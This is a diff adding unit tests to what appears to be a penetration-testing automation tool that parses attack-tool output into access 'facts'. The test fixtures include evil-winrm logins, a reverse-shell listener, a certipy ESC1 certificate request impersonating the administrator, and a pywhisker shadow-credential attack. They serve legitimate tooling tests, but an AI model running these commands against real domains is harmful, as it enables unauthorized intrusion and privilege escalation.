@@ -529,3 +529,168 @@ def test_non_exec_command_with_identity_text_does_not_prove_foothold():
     kinds = {fact.kind for fact in facts}
     assert "foothold.windows" not in kinds
     assert "access.system" not in kinds
+
+
+def test_evil_winrm_interactive_session_proves_access_desktop():
+    ws = _workspace()
+    action = next(action for action in load_pack() if action.id == "lateral-exec")
+    out = r"""
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_backup\Documents>
+"""
+    facts = parse_action_output(
+        action,
+        ws,
+        "evil-winrm -i 10.10.10.10 -u svc_backup -p 'Passw0rd!'",
+        out,
+        "",
+        "test",
+    )
+    kinds = {fact.kind for fact in facts}
+    assert {"foothold.windows", "access.desktop"} <= kinds
+
+
+def test_penelope_windows_shell_proves_desktop_and_foothold():
+    ws = _workspace()
+    action = next(action for action in load_pack() if action.id == "lateral-exec")
+    out = r"""
+[+] Listening for reverse shells on 0.0.0.0:4444
+[+] Got reverse shell from WIN-DC01~10.10.10.10-Windows-x64 - Assigned SessionID 1
+[+] Attempting to upgrade shell to PTY...
+"""
+    facts = parse_action_output(action, ws, "penelope.py 4444", out, "", "test")
+    kinds = {fact.kind for fact in facts}
+    assert {"access.shell", "foothold.windows", "access.desktop"} <= kinds
+    shell = next(fact for fact in facts if fact.kind == "access.shell")
+    assert shell.value["handler"] == "penelope"
+    assert shell.value["os"] == "windows"
+    assert shell.value["hostname"] == "WIN-DC01"
+    assert shell.value["session_id"] == "1"
+    # No whoami yet -> SYSTEM is not claimed.
+    assert "access.system" not in kinds
+
+
+def test_penelope_linux_shell_is_linux_foothold_not_windows():
+    ws = _workspace()
+    action = next(action for action in load_pack() if action.id == "lateral-exec")
+    out = "[+] Got reverse shell from web01~10.10.10.20-Linux-x86_64 - Assigned SessionID 2\n"
+    facts = parse_action_output(action, ws, "penelope 4444", out, "", "test")
+    kinds = {fact.kind for fact in facts}
+    assert {"access.shell", "foothold.linux"} <= kinds
+    assert "foothold.windows" not in kinds
+    assert "access.desktop" not in kinds
+    assert "access.system" not in kinds
+
+
+def test_penelope_windows_shell_with_system_whoami_proves_access_system():
+    ws = _workspace()
+    action = next(action for action in load_pack() if action.id == "lateral-exec")
+    out = r"""
+[+] Got reverse shell from WIN-DC01~10.10.10.10-Windows-x64 - Assigned SessionID 1
+PS C:\> whoami
+nt authority\system
+"""
+    facts = parse_action_output(action, ws, "penelope.py 4444", out, "", "test")
+    kinds = {fact.kind for fact in facts}
+    assert {"access.shell", "foothold.windows", "access.desktop", "access.system"} <= kinds
+
+
+def test_penelope_windows_shell_unlocks_on_host_enum():
+    ws = _workspace()
+    ws.facts.add(Fact("ad.domain_known", "domain:acme.corp", {"name": "acme.corp"}, source="test"))
+    action = next(action for action in load_pack() if action.id == "lateral-exec")
+    out = "[+] Got reverse shell from WIN-DC01~10.10.10.10-Windows-x64 - Assigned SessionID 1\n"
+    facts = parse_action_output(action, ws, "penelope.py 4444", out, "", "test")
+    for fact in facts:
+        ws.facts.add(fact)
+    unlocked = {action.id for action in next_actions(ws.facts)}
+    # foothold.windows + access.desktop unlock the on-host PowerShell/.NET enum.
+    assert "ad-legacy-enum" in unlocked
+    assert "ad-psdotnet-enum" in unlocked
+
+
+def test_certipy_find_reports_vulnerable_templates_only():
+    ws = _workspace()
+    ws.facts.add(Fact("ad.domain_known", "domain:acme.corp", {"name": "acme.corp"}, source="test"))
+    action = next(action for action in load_pack() if action.id == "adcs-esc")
+    out = r"""
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+Certificate Templates
+  0
+    Template Name                       : ServerAuth-ESC1
+    [!] Vulnerabilities
+      ESC1                              : 'ACME.CORP\Domain Users' can enroll, enrollee supplies subject
+  1
+    Template Name                       : WebEnroll-ESC8
+    [!] Vulnerabilities
+      ESC8                              : Web enrollment is enabled and request disable is not set
+"""
+    facts = parse_action_output(
+        action,
+        ws,
+        "certipy find -u svc@acme.corp -p 'Passw0rd!' -dc-ip 10.10.10.10 -vulnerable",
+        out,
+        "",
+        "test",
+    )
+    kinds = {fact.kind for fact in facts}
+    assert "adcs.vulnerable" in kinds
+    adcs = next(fact for fact in facts if fact.kind == "adcs.vulnerable")
+    assert adcs.value["esc"] == ["ESC1", "ESC8"]
+    assert adcs.value["templates"] == ["ServerAuth-ESC1", "WebEnroll-ESC8"]
+    assert adcs.scope == "domain:acme.corp"
+    # Finding a vulnerable template is context, not a certificate or access.
+    assert "credential.certificate" not in kinds
+    assert "credential.available" not in kinds
+    assert "access.admin" not in kinds
+
+
+def test_certipy_req_pfx_is_certificate_material_not_access():
+    ws = _workspace()
+    action = next(action for action in load_pack() if action.id == "adcs-esc")
+    out = r"""
+Certipy v4.8.2
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@acme.corp'
+[*] Saved certificate and private key to 'administrator.pfx'
+"""
+    facts = parse_action_output(
+        action,
+        ws,
+        "certipy req -u svc@acme.corp -p 'Passw0rd!' -dc-ip 10.10.10.10 -ca ACME-CA -template ServerAuth-ESC1 -upn administrator@acme.corp",
+        out,
+        "",
+        "test",
+    )
+    kinds = {fact.kind for fact in facts}
+    assert "credential.certificate" in kinds
+    cert = next(fact for fact in facts if fact.kind == "credential.certificate")
+    assert cert.value["files"] == ["administrator.pfx"]
+    assert cert.value["principal"] == "administrator"
+    # A certificate is auth material, not yet a login or admin access.
+    assert "credential.available" not in kinds
+    assert "access.admin" not in kinds
+
+
+def test_pywhisker_shadow_credential_records_certificate_material():
+    ws = _workspace()
+    action = next(action for action in load_pack() if action.id == "shadow-credentials")
+    out = r"""
+[*] Searching for the target account
+[*] Generating certificate
+[+] Saved PFX (#PKCS12) certificate & key at path: J9fk2Lms.pfx
+[*] Must be used with password: 6h2Xq1
+"""
+    facts = parse_action_output(
+        action,
+        ws,
+        "pywhisker.py -d acme.corp -u svc -p 'Passw0rd!' --target victim$ --action add",
+        out,
+        "",
+        "test",
+    )
+    kinds = {fact.kind for fact in facts}
+    assert "credential.certificate" in kinds
+    assert "access.admin" not in kinds
